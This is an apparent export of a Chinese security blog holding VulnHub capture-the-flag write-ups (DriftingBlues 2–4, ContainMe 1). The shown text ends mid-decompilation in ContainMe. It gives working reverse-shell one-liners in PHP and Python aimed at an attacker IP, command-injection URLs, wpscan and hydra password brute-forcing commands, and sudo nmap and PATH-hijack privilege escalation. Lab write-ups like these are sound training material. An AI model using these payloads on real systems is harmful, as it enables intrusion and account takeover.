class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.38 (Debian)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://192.168.159.132/blog/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://192.168.159.132/blog/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.159.132/blog/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://192.168.159.132/blog/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 6.4.3 identified (Latest, released on 2024-01-30).</span></span><br><span class="line"><span class="string"> | Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.159.132/blog/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> | Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.159.132/blog/, Match: &#x27;</span>WordPress 6.4.3<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==============================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] albert</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WPScan DB API OK</span></span><br><span class="line"><span class="string"> | Plan: free</span></span><br><span class="line"><span class="string"> | Requests Done (during the scan): 1</span></span><br><span class="line"><span class="string"> | Requests Remaining: 24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Wed Mar 27 02:39:54 2024</span></span><br><span class="line"><span class="string">[+] Requests Done: 53</span></span><br><span class="line"><span class="string">[+] Cached Requests: 4</span></span><br><span class="line"><span class="string">[+] Data Sent: 12.367 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 143.694 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 104.293 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:13</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>枚举出个 albert 用户</p>
<p>看 wp 站点源码猜测可能需要修改 hosts 让 driftingblues.box 指向
192.168.159.132</p>
<p>修改后尝试子域挖掘……没找到，换字典继续尝试目录遍历……也依旧没找到有价值的信息</p>
<p>尝试对 wp 进行 SQL 注入……失败……尝试直接爆破 albert 用户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://192.168.159.132/blog/&quot;</span> --usernames albert --passwords rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271607673.png" /></p>
<p>得 albert / scotland1</p>
<p>也可用 hydra 爆破【<a
href="https://blog.csdn.net/lixiangminghate/article/details/104335778">Hydra爆破[无验证码]Web页面_hydra
网页-CSDN博客</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -l albert -P rockyou.txt -f -t 10 -v driftingblues.box http-post-form <span class="string">&quot;/blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fdriftingblues.box%2Fblog%2Fwp-admin%2F&amp;testcookie=1:Lost your password&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271618535.png" /></p>
<p>注，这里为什么不用 <code>incorrect</code>
作为关键字是因为密码为空时响应并不包含 <code>incorrect</code> ！</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>登录 wp：albert / scotland1，经测试该用户有修改主题的权限，直接反弹
shell【<a href="https://gtfobins.github.io/gtfobins/php/">php |
GTFOBins</a>】</p>
<p>kali 先开启监听</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;php -r \&#x27;$sock=fsockopen(&quot;192.168.159.152&quot;,&quot;4444&quot;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);\&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271641748.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271641749.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="提权">2.2. 提权</h3>
<p>freddie 下找到了该用户的ssh登录公私钥，利用 scp 将私钥传到 kali
尝试破解</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271717170.png" /></p>
<p>经测没有密码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271717171.png" /></p>
<p>ssh 直接登录 freddie 用户，基于 freddie 用户进一步尝试提权</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271717173.png" /></p>
<p>flag 1</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271734130.png" /></p>
<p>nmap 提权【<a href="https://gtfobins.github.io/gtfobins/nmap/">nmap |
GTFOBins</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">TF=$(<span class="built_in">mktemp</span>) &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; <span class="variable">$TF</span> &amp;&amp; sudo nmap --script=<span class="variable">$TF</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403271723372.png" /></p>
<p>拿到 flag 2！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 3</title>
    <url>/2024/03/27/DriftingBlues%203/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-3,656/">DriftingBlues:
3 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272107932.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272107084.png" /></p>
<p>开了：22,80</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>目录扫描</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272107992.png" /></p>
<p>依次访问</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272108759.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272108761.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272108762.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">intruder? L2FkbWluc2ZpeGl0LnBocA==</span><br><span class="line"></span><br><span class="line">=&gt;</span><br><span class="line"></span><br><span class="line">/adminsfixit.php</span><br></pre></td></tr></table></figure>
<p>访问 /adminsfixit.php 发现包含了 ssh 的日志，可尝试利用对 ssh
日志的注入获取 shell【<a
href="https://zhuanlan.zhihu.com/p/371065742">文件包含漏洞GetShell利用方法丨漏洞银行技术分享
- 知乎</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272110890.png" /></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272110486.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272110487.png" /></p>
<p>成功！利用 php 反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.159.136/adminsfixit.php?cmd=php+-r+%27%24sock%3dfsockopen(%22192.168.159.152%22%2c4444)%3bexec(%22%2fbin%2fbash+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272111729.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v /proc  <span class="comment"># 查找具有写入权限的文件</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272113231.png" /></p>
<p>尝试写入 ssh 登录的公私钥</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272018404.png" /></p>
<p>将私钥 id_rsa 下载 kali【python3 -m http.server】</p>
<p>给予权限，利用私钥登录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272022125.png" /></p>
<p>失败……查下 ssh 的配置 <code>cat /etc/ssh/sshd_config</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272024108.png" /></p>
<p>修改公钥</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272026664.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272026665.png" /></p>
<p>拿到第一个 flag，继续提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272041257.png" /></p>
<p>可能是利用 /usr/bin/getinfo 执行了一些系统命令</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272044340.png" /></p>
<p>利用 scp 传到本地分析</p>
<p>利用 ida 反汇编</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272118233.png" /></p>
<p>另一种 kali 的 strings 也可【<a
href="https://www.cnblogs.com/sainet/p/16330998.html">Vulnhub 靶场
DRIFTINGBLUES: 3 - sainet - 博客园</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272050850.png" /></p>
<p>尝试写个同名的命令文件，并修改环境变量，让 getinfo
执行时调用提权的命令文件，ip 为例</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/robertj/				</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; ip		<span class="comment"># 把/bin/bash写入到ip中。</span></span><br><span class="line"><span class="built_in">chmod</span> +x ip					<span class="comment"># 增加执行权限</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span>         <span class="comment"># 修改$PATH 变量，添加当前路径到系统路径中</span></span><br><span class="line">/usr/bin/getinfo</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403272106006.png" /></p>
<p>拿到第 2 个flag！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>DriftingBlues: 4</title>
    <url>/2024/03/28/DriftingBlues%204/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/driftingblues-4,661/">DriftingBlues:
4 ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281258366.png" /></p>
<p>注，后面尝试爆破ssh时导致靶机崩溃了，重新导入安装了一次，IP 更新为
138 了</p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281300537.png" /></p>
<p>所开端口：21,22,80</p>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>目录遍历没扫到什么，不过主页源码找到个 base64 编码的隐藏信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281302025.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09</span><br><span class="line">=&gt;   </span><br><span class="line">go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==</span><br><span class="line">=&gt;  </span><br><span class="line">tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=</span><br><span class="line">=&gt;  </span><br><span class="line">i hope you<span class="string">&#x27;re an employee L2ltZnVja2luZ21hZC50eHQ=</span></span><br><span class="line"><span class="string">=&gt;</span></span><br><span class="line"><span class="string">/imfuckingmad.txt</span></span><br></pre></td></tr></table></figure>
<p>访问 /imfuckingmad.txt 得 Brainfuck 加密信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281304257.png" /></p>
<p>在线解密【<a
href="https://ctf.bugku.com/tool/brainfuck">Brainfuck/OoK加密解密 -
Bugku CTF</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281305908.png" /></p>
<p>访问 /iTiS3Cr3TbiTCh.png ，是个二维码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281305780.png" /></p>
<p>扫码得：https://i.imgur.com/a4JjS76.png</p>
<p><strong>经测需挂代理访问</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281306768.png" /></p>
<p>应该是几个用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">luther</span><br><span class="line">gary</span><br><span class="line">hubert</span><br><span class="line">clark</span><br></pre></td></tr></table></figure>
<p>尝试 ssh 爆破未果，爆破 ftp 得到个密码 luther/mypics</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281309633.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281309635.png" /></p>
<p>ftp 登录没发现有啥价值的信息，不过看到个 hubert
的文件夹，该用户或许也能爆破，尝试对该用户爆破</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281309636.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281311904.png" /></p>
<p>得 hubert/john316，ftp 可以正常登录，为此可以尝试本地生成 ssh
登录的公私钥，然后将公钥传上去，最后本地用 ssh 私钥登录 hubert 用户</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>本地生成ssh登录密钥</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281324456.png" /></p>
<p>ftp 上传</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281324452.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281324453.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281324454.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281324455.png" /></p>
<p>拿到 flag 1!</p>
<h3 id="提权">2.2. 提权</h3>
<p>提权操作和 [[DriftingBlues 3]] 靶机【<a
href="https://z9m8r8.github.io/2024/03/27/DriftingBlues%203/">DriftingBlues:
3 | Ghost's Blog</a>】一样……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403281330807.png" /></p>
<p>拿到 flag2!</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>shell</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>ContainMe: 1</title>
    <url>/2024/03/11/ContainMe%20%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/containme-1,729/">ContainMe: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111624346.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111625789.png" /></p>
<p>所开端口：22,80,2222,8022</p>
<h3 id="web-信息收集">1.3. web 信息收集</h3>
<p>主页未找到有价值信息，遍历目录</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111629137.png" /></p>
<p>依次访问</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111630003.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111630005.png" /></p>
<p>猜测 <code>http://192.168.159.137/index.php</code> 存在
RCE，FUZZ下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -Z -w /usr/share/wordlists/wfuzz/general/common.txt -u <span class="string">&quot;http://192.168.159.137/index.php?FUZZ=pwd&quot;</span> --hw 60</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111633821.png" /></p>
<p>对比 <code>http://192.168.159.137/index.php</code> 和
<code>http://192.168.159.137/index.php?path=pwd</code> 返回的信息猜测
index.php 中会调用某个命令执行函数来执行 <code>ls + path</code>
，或许可利用 path 参数实现多命令执行，测试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111640279.png" /></p>
<p>存在 RCE 可利用</p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>尝试反弹个 shell【<a
href="https://forum.ywhack.com/reverse-shell/">反弹shell生成器</a>】，经测试利用
Python 实现可以成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.159.152&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>注，python-&gt;python3</p>
<p><code>http://192.168.159.137/index.php?path=/;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.159.152%22,6666));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111652095.png" /></p>
<h3 id="提权">2.2. 提权</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<p>有个 <code>crypt</code> 很可疑，并在 /home/mike
用户下找到个相似的文件 <code>1cryptupx</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111658361.png" /></p>
<p>尝试执行</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111704781.png" /></p>
<p>提示需要破解，加个 <code>-h</code> 时会输出个 <code>You wish!</code>
, 利用 scp 传出来分析分析</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111715040.png" /></p>
<p>根据 <code>1cryptupx</code> 名字猜测需要 upx 脱壳，利用 kali 自带的
upx 尝试未成功！</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111708085.png" /></p>
<p>window 找到个 UPX TOOL 成功脱壳</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111711275.png" /></p>
<p>安装个 IDA PRO 反汇编 <code>1cryptupx</code> 和
<code>crypt</code>……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111731328.png" /></p>
<p>看到 You wish!，跳到 sub_4016AD ,再 F5 伪代码</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111731329.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403111737441.png" /></p>
<p>没看懂……谷歌……看别人的解释是如果输入的密码正确，将以 root 身份调用
"/bin/bash"</p>
<p>完整代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_4016AD</span><span class="params">(<span class="type">int</span> a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v8[<span class="number">1048</span>]; <span class="comment">// [rsp+2h] [rbp-418h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_41EAA0(</span><br><span class="line">    <span class="string">&quot;鈻戔枅鈻堚枅鈻堚枅鈺椻枒鈻堚枅鈻堚枅鈻堚枅鈺椻枒鈻堚枅鈺椻枒鈻戔枒鈻堚枅鈺椻枅鈻堚枅鈻堚枅鈻堚晽鈻戔枅鈻堚枅鈻堚枅鈻堚枅鈻堚晽鈻戔枅鈻堚枅鈻堚枅鈻堚晽鈻堚枅鈺椻枒鈻戔枅鈻堚晽鈻堚枅鈻堚枅鈻堚枅鈻堚晽鈻堚枅鈺椻枒鈻戔枒鈻戔枒鈻堚枅鈺椻&quot;</span></span><br><span class="line">    <span class="string">&quot;枒鈻戔枒鈻戔枒&quot;</span>);</span><br><span class="line">  sub_41EAA0(</span><br><span class="line">    <span class="string">&quot;鈻堚枅鈺斺晲鈺愨枅鈻堚晽鈻堚枅鈺斺晲鈺愨枅鈻堚晽鈺氣枅鈻堚晽鈻戔枅鈻堚晹鈺濃枅鈻堚晹鈺愨晲鈻堚枅鈺椻暁鈺愨晲鈻堚枅鈺斺晲鈺愨暆鈻堚枅鈺斺晲鈺愨晲鈺愨暆鈻堚枅鈺戔枒鈻戔枅鈻堚晳鈻堚枅鈺斺晲鈺愨晲鈺愨暆鈻堚枅鈺戔枒鈻戔枒鈻戔枒鈻堚枅鈺戔&quot;</span></span><br><span class="line">    <span class="string">&quot;枒鈻戔枒鈻戔枒&quot;</span>);</span><br><span class="line">  sub_41EAA0(</span><br><span class="line">    <span class="string">&quot;鈻堚枅鈺戔枒鈻戔暁鈺愨暆鈻堚枅鈻堚枅鈻堚枅鈺斺暆鈻戔暁鈻堚枅鈻堚枅鈺斺暆鈻戔枅鈻堚枅鈻堚枅鈻堚晹鈺濃枒鈻戔枒鈻堚枅鈺戔枒鈻戔枒鈺氣枅鈻堚枅鈻堚枅鈺椻枒鈻堚枅鈻堚枅鈻堚枅鈻堚晳鈻堚枅鈻堚枅鈻堚晽鈻戔枒鈻堚枅鈺戔枒鈻戔枒鈻戔枒鈻堚枅鈺戔&quot;</span></span><br><span class="line">    <span class="string">&quot;枒鈻戔枒鈻戔枒&quot;</span>);</span><br><span class="line">  sub_41EAA0(</span><br><span class="line">    <span class="string">&quot;鈻堚枅鈺戔枒鈻戔枅鈻堚晽鈻堚枅鈺斺晲鈺愨枅鈻堚晽鈻戔枒鈺氣枅鈻堚晹鈺濃枒鈻戔枅鈻堚晹鈺愨晲鈺愨暆鈻戔枒鈻戔枒鈻堚枅鈺戔枒鈻戔枒鈻戔暁鈺愨晲鈺愨枅鈻堚晽鈻堚枅鈺斺晲鈺愨枅鈻堚晳鈻堚枅鈺斺晲鈺愨暆鈻戔枒鈻堚枅鈺戔枒鈻戔枒鈻戔枒鈻堚枅鈺戔&quot;</span></span><br><span class="line">    <span class="string">&quot;枒鈻戔枒鈻戔枒&quot;</span>);</span><br><span class="line">  sub_41EAA0(</span><br><span class="line">    <span class="string">&quot;鈺氣枅鈻堚枅鈻堚枅鈺斺暆鈻堚枅鈺戔枒鈻戔枅鈻堚晳鈻戔枒鈻戔枅鈻堚晳鈻戔枒鈻戔枅鈻堚晳鈻戔枒鈻戔枒鈻戔枒鈻戔枒鈻堚枅鈺戔枒鈻戔枒鈻堚枅鈻堚枅鈻堚枅鈺斺暆鈻堚枅鈺戔枒鈻戔枅鈻堚晳鈻堚枅鈻堚枅鈻堚枅鈻堚晽鈻堚枅鈻堚枅鈻堚枅鈻堚晽鈻堚枅鈻堚&quot;</span></span><br><span class="line">    <span class="string">&quot;枅鈻堚枅鈻堚晽&quot;</span>);</span><br><span class="line">  